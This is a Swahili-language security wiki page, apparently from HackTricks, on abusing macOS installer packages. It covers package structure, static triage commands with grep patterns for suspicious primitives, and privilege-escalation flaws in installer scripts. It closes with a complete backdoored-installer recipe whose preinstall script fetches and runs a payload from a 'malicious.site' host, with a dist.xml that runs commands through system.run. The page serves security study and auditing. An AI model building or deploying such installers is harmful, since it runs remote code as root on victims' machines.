# Matumizi Mabaya ya macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi za Pkg

**installer package** ya macOS (pia inajulikana kama faili la `.pkg`) ni format ya faili inayotumiwa na macOS **kusambaza software**. Faili hizi ni kama **boxi linalojumuisha kila kitu ambacho software** inahitaji ili kusakinishwa na kufanya kazi kwa usahihi.

Faili la package lenyewe ni archive linalohifadhi **hierarchy ya mafaili na directories zitakazosakinishwa kwenye** computer lengwa. Linaweza pia kujumuisha **scripts** za kutekeleza kazi kabla na baada ya installation, kama vile kuweka configuration files au kusafisha matoleo ya zamani ya software.

### Muundo wa Package

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) na ukaguzi wa script/installation
- **PackageInfo (xml)**: Taarifa, mahitaji ya installation, eneo la installation, paths za scripts za ku-run
- **Bill of materials (bom)**: Orodha ya mafaili ya kusakinisha, kusasisha au kuondoa pamoja na file permissions
- **Payload (CPIO archive gzip compressed)**: Mafaili ya kusakinisha kwenye `install-location` kutoka PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre na post install scripts pamoja na resources nyingine zilizotolewa kwenye temp directory kwa ajili ya execution.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Ili kuona yaliyomo kwenye installer bila ku-decompress manually, unaweza pia kutumia tool ya bure [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Njia za mkato za static triage

Ikiwa lengo ni kufanya analysis, jaribu **kuepuka kufungua package kwa `Installer.app` kwanza**. Baadhi ya packages zinaweza kutekeleza code mara tu Installer inapozifungua (kwa mfano kupitia `system.run()` au installer plug-ins), kwa hiyo offline extraction kwa kawaida ndiyo mwanzo salama zaidi.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Maelezo ya Msingi ya DMG

Faili za DMG, au Apple Disk Images, ni format ya faili inayotumiwa na Apple's macOS kwa disk images. Faili ya DMG kimsingi ni **mountable disk image** (ina filesystem yake yenyewe) iliyo na raw block data ambayo kwa kawaida imebanwa na wakati mwingine imesimbwa kwa njia fiche. Unapofungua faili ya DMG, macOS **hui-mount kama vile ingekuwa physical disk**, hivyo kukuwezesha kufikia yaliyomo.

> [!CAUTION]
> Kumbuka kwamba installers za **`.dmg`** zina-support **formats nyingi sana**, kiasi kwamba hapo awali baadhi yake zilizokuwa na vulnerabilities zilitumiwa vibaya kupata **kernel code execution**.

### Muundo wa Disk Image

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hierarchy ya faili ya DMG inaweza kutofautiana kulingana na yaliyomo. Hata hivyo, kwa application DMGs, kwa kawaida hufuata muundo huu:

- Top Level: Hii ni root ya disk image. Mara nyingi huwa na application na pengine link ya Applications folder.
- Application (.app): Hii ndiyo application halisi. Katika macOS, application kwa kawaida ni package iliyo na files na folders nyingi binafsi zinazounda application.
- Applications Link: Hii ni shortcut ya Applications folder katika macOS. Kusudi lake ni kurahisisha kusakinisha application. Unaweza kuburuta faili ya .app hadi kwenye shortcut hii ili kusakinisha app.

## Privesc kupitia abuse ya pkg

### Execution kutoka public directories

Ikiwa pre- au post-installation script itatekeleza faili kama **`/var/tmp/Installerutil`** na attacker anaweza kubadilisha faili hiyo, attacker anaweza kufanya privilege escalation wakati installer inapoiita. Talks na walkthrough zilizotajwa zinaonyesha variants za insecure external-script pattern hii.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Hii ni [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) ambayo installers na updaters kadhaa huiita ili **kutekeleza kitu kama root**. Function hii hupokea **path** ya **file** ya **kutekeleza** kama parameter; hata hivyo, ikiwa attacker angeweza **kurekebisha** faili hii, angeweza **kutumia vibaya** execution yake kwa root ili **kufanya privilege escalation**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Kwa maelezo zaidi angalia talk hii: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Matumizi mabaya ya Environment na shebang

Bugs za kisasa za PackageKit zilionyesha kwamba installer scripts mara nyingi hutekelezwa kama **trusted root code**, huku zikiendelea kuwa na context inayodhibitiwa na attacker karibu. Wakati wa kukagua vendor packages, zingatia hasa:

- Shell interpreters kama `#!/bin/zsh` / `#!/bin/bash`
- Calls kama `sudo -u $USER`, `launchctl asuser`, au logic yoyote inayoamini `$USER`, `$HOME`, `PATH`, `TMPDIR`, au relative paths
- Non-shell interpreters ambazo zinaweza kupakia init files au libraries zinazodhibitiwa na user
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Kwa bug ya 2024 ya PackageKit root-environment (`~/.zshenv` / `~/.bash*` inheritance wakati wa installs zilizoanzishwa na mtumiaji), angalia [generic macOS privesc page](../macos-privilege-escalation.md). Ikiwa package **imesainiwa na Apple**, bug hiyo hiyo ya script inaweza kuwa **muhimu kwa SIP/TCC** kwa sababu `system_installd` inaweza kubeba `com.apple.rootless.install.heritable`; tazama [SIP page](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Execution kwa mounting

Ikiwa installer itaandika kwenye `/tmp/fixedname/bla/bla`, inawezekana **kuunda mount** juu ya `/tmp/fixedname` kwa kutumia noowners ili uweze **kubadilisha faili yoyote wakati wa installation** na kutumia vibaya mchakato wa installation.

Mfano wa hili ni **CVE-2021-26089**, ambayo iliweza **kuoverwrite script ya periodic** ili kupata execution kama root. Kwa maelezo zaidi tazama talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg kama malware

### Payload Tupu

Inawezekana kutengeneza faili ya **`.pkg`** yenye **pre na post-install scripts** bila payload halisi yoyote, isipokuwa malware iliyo ndani ya scripts.<sup>[[2]](#references)</sup>

### JS katika Distribution xml

Inawezekana kuongeza tags za **`<script>`** katika faili ya **distribution xml** ya package, na code hiyo itatekelezwa; inaweza **kutekeleza commands** kwa kutumia **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Katika distribution packages, hii kwa kawaida hutegemea faili ya kiwango cha juu `Distribution` kuruhusu external scripts, kwa mfano kwa kutumia `allow-external-scripts="true"`. Kwa hiyo, kukagua `preinstall` / `postinstall` pekee hakutoshi: **Distribution XML yenyewe** inaweza kuwa na hooks za `installation-check` / `volume-check` na execution paths za moja kwa moja za `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

Installer hasidi inayotumia script na code ya JS ndani ya dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Kufungua Pkgs: Kuangalia Ndani ya Macos Installer Packages na Dosari za Kawaida za Usalama](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "Ulimwengu Pori wa macOS Installers" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Kufungua Pkgs: Kuangalia Ndani ya MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – Red Teaming ya macOS: Exploiting Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: Privilege Escalation ya macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Kuvunja SIP kwa Apple-signed Packages](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Kufa kwa Installers 1000 kwenye macOS na kila kitu kimeharibika!](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
